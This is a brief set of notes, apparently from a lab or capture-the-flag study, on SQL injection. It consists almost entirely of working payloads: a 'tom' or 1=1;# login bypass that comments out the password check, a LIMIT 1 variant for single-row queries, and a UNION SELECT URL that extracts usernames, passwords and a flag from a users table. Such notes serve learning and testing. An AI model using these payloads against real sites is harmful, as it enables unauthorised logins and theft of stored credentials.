### Identifying SQL Injection Vulnerabilities
```
select * from users where name = 'tom' or 1=1;#' and password = 'jones';
```

### Authentication Bypass
```
Some programming languages have functions that query the database and expect a single record. If these functions get more than one row, they will generate an error
select * from users where name = 'tom' or 1=1 LIMIT 1;#
http://url/debug.php?id=1+UNION+SELECT+id,username,password,flag,time+FROM+users
```
